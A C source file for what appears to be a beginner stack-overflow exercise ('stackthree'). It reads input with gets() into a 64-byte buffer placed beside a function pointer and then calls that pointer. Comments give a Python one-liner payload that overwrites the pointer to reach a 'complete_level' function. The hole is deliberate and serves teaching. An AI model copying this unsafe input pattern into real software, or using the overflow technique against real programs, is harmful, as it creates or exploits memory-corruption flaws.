#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// python -c "print 'A'*64 + '\xb6\x11\x40'" | ./stackthree
// ./stackthree <<< $(python -c "print 'A'*64 + '\xb6\x11\x40'")

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished this level");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}